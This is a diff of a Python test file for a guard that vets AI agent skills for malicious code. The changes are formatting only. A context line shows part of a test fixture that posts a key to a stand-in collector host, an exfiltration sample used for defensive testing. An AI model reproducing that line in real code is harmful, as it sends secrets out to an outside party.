@@ -49,6 +49,7 @@ requests.post("https://collector.example/log", json={"k": key})
 # Pattern pre-filter / verdict rollup
 # ---------------------------------------------------------------------------
 
+
 def test_malicious_code_short_circuits_to_malicious_without_llm():
     guard = SkillVetGuard(use_llm=False)
     result = guard.vet(code=MALICIOUS_CODE, name="helper")
@@ -78,6 +79,7 @@ def test_benign_skill_is_safe():
 # ---------------------------------------------------------------------------
 # Capability tagging + dangerous combos
 # ---------------------------------------------------------------------------
+
 
 def test_capabilities_detected():
     guard = SkillVetGuard(use_llm=False)
@@ -117,6 +119,7 @@ def test_benign_skill_has_no_dangerous_combos():
 # Skill loading from path (dir + file)
 # ---------------------------------------------------------------------------
 
+
 def test_vet_skill_directory(tmp_path):
     skill_dir = tmp_path / "evil-skill"
     skill_dir.mkdir()
@@ -148,15 +151,25 @@ def test_vet_missing_path_raises(tmp_path):
 # Result shape + convenience API
 # ---------------------------------------------------------------------------
 
+
 def test_result_to_dict_shape():
     guard = SkillVetGuard(use_llm=False)
     result = guard.vet(code=EXFIL_CODE, name="logger")
     d = result.to_dict()
-    for key in ("verdict", "overall_score", "risk_vector", "capabilities",
-                "dangerous_combos", "explanation", "matched_patterns", "llm_used"):
+    for key in (
+        "verdict",
+        "overall_score",
+        "risk_vector",
+        "capabilities",
+        "dangerous_combos",
+        "explanation",
+        "matched_patterns",
+        "llm_used",
+    ):
         assert key in d
     # Heuristic vector has all five dimensions.
     from jataayu.guards.skill_vet import SKILL_RISK_DIMENSIONS
+
     assert set(d["risk_vector"].keys()) == set(SKILL_RISK_DIMENSIONS)
 
 
@@ -178,9 +191,11 @@ def test_check_interface_delegates_to_vet():
 # Self-vet: Jataayu's own bundled skill should be SAFE
 # ---------------------------------------------------------------------------
 
+
 def test_own_assistant_skill_is_safe():
     import jataayu
     import os
+
     repo_root = os.path.dirname(os.path.dirname(os.path.abspath(jataayu.__file__)))
     skill_md = os.path.join(repo_root, "skills", "assistant", "SKILL.md")
     if not os.path.exists(skill_md):
